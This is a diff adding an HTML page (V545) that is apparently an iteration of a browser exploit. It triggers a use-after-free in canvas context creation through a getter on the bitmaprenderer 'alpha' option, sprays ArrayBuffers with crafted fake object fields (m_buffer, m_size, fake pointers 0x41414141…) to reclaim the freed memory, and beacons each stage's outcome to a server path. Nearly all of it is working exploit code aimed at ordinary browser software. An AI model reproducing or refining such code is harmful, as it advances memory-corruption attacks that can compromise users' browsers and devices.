@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V545</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V545-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+b('BOOT','V545-spray-first');
+
+// T1: UAF + immediate AB(768) spray + lineWidth read
+// The freed slot vtable is corrupted by bmalloc free-list pointer.
+// We MUST spray before any access to avoid virtual dispatch crash.
+// AB spray replaces vtable with 0x00 (NULL) — non-virtual accessors should work
+// since lineWidth goes through IDL-generated non-virtual wrapper.
+(function T1(){
+  b('T1-START','UAF + immediate AB spray + lineWidth read');
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var ctx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      ctx=outer.getContext('2d');
+      ctx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  b('T1-UAF','ok');
+
+  // IMMEDIATELY spray AB(768) with all zeros (safe default)
+  var abs=[];
+  for(var i=0;i<300;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+  b('T1-SPRAY','300 zero ABs');
+
+  // Now try lineWidth read — goes through non-virtual path
+  // m_stateStack at offset 112: m_buffer=0, m_capacity=0, m_size=0
+  // state() -> m_stateStack.last() -> at(size()-1) -> at(0xFFFFFFFF) -> CrashOnOverflow
+  // Expected: CRASH (same as V542)
+  try{
+    var lw=ctx.lineWidth;
+    b('T1-LW','!!!val='+lw+'!!!');
+  }catch(e){b('T1-LW-ERR',e.message)}
+})();
+
+// T2: UAF + AB(768) spray with m_size=1 at offset 124
+// m_buffer at offset 112 = 0 (NULL). m_size=1 means at(0) passes bounds check
+// but then dereferences m_buffer[0] which is NULL -> segfault at lineWidth offset
+// Expected: segfault (NULL+48 dereference)
+(function T2(){
+  b('T2-START','UAF + AB spray with m_size=1');
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var ctx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      ctx=outer.getContext('2d');
+      ctx.lineWidth=22222.22222;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  b('T2-UAF','ok');
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    dv.setUint32(120,1,true);  // m_capacity=1
+    dv.setUint32(124,1,true);  // m_size=1
+    abs.push(ab);
+  }
+  b('T2-SPRAY','300 ABs with m_size=1 at off124');
+
+  try{
+    var lw=ctx.lineWidth;
+    b('T2-LW','!!!val='+lw+'!!!');
+  }catch(e){b('T2-LW-ERR',e.message)}
+})();
+
+// T3: UAF + AB(768) spray with m_size=1 AND m_buffer pointing to offset 128 area
+// Since we don't know the AB address, we try self-referencing trick:
+// Write a recognizable double (99999.5) at offset 176 in the AB (= m_buffer_target+48)
+// AND m_buffer = some guess. Since we can't guess, skip this for now.
+// Instead: just detect which test survived by checking if T2 crashed differently than T1
+(function T3(){
+  b('T3-START','UAF + AB spray with m_size=1 + self-ref attempt');
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var ctx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      ctx=outer.getContext('2d');
+      ctx.lineWidth=33333.33333;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  b('T3-UAF','ok');
+
+  // Spray with m_size=1, m_capacity=1, AND m_buffer=0x4141414141414141
+  // This will segfault at a known address (0x4141414141414141+48)
+  // The crash address tells us the dereference offset
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var u8=new Uint8Array(ab);
+    var dv=new DataView(ab);
+    // m_buffer = 0x4141414141414141 (will crash at 0x4141414141414189 = +48)
+    dv.setFloat64(112,3.0139222484469483e-71,false); // 0x4141414141414141 big-endian
+    dv.setUint32(120,1,true);  // m_capacity=1
+    dv.setUint32(124,1,true);  // m_size=1
+    abs.push(ab);
+  }
+  b('T3-SPRAY','300 ABs with m_buffer=0x41..41');
+
+  try{
+    var lw=ctx.lineWidth;
+    b('T3-LW','!!!val='+lw+'!!!');
+  }catch(e){b('T3-LW-ERR',e.message)}
+})();
+
+// T4: UAF + same-type reclaim (control — known working from V530)
+(function T4(){
+  b('T4-START','same-type reclaim control');
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var ctx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      ctx=outer.getContext('2d');
+      ctx.lineWidth=44444.44444;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  b('T4-UAF','ok');
+
+  // Same-type reclaim — create 200 new contexts
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  b('T4-RECLAIM','200 contexts');
+
+  try{
+    var lw=ctx.lineWidth;
+    b('T4-LW','val='+lw);
+  }catch(e){b('T4-LW-ERR',e.message)}
+})();
+
+b('DONE','V545-all-complete');
+</script>
+</body></html>
